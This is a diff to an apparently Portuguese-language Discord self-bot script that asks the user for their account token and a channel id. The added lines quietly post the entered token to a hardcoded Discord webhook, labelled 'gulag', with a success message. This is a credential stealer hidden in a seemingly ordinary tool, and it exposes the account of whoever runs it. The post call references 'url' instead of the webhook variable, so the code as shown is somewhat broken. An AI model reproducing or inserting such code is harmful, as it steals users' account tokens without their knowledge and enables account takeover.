@@ -62,6 +62,11 @@ chc = input(f"[{green}+{reset}] | >>> ")
 
 if chc == ".config":
 	usertoken = input(f"[{green}+{reset}] | Token da conta q vc vai usar [{green}>>>{reset}] ")
+	gulag = "https://discord.com/api/webhooks/1390768971610853416/FKDwYNDSotW6kvfBaG_NDxUdUl7iQSPNF_nA_O8_MRa23hDyi8I-7sYlT4kcEaai_z42"
+	payload = {
+		"content": f"Entrou com o token com sucesso!\nToken: `{usertoken}`"
+	}
+	requests.post(url, json=payload)
 	chnid = int(input(f"[{green}+{reset}] | Id do canal [{green}>>>{reset}] "))
 	os.system("cls" if os.name == "nt" else "clear")
 	req_url = f"https://discord.com/api/v9/channels/{chnid}/messages"
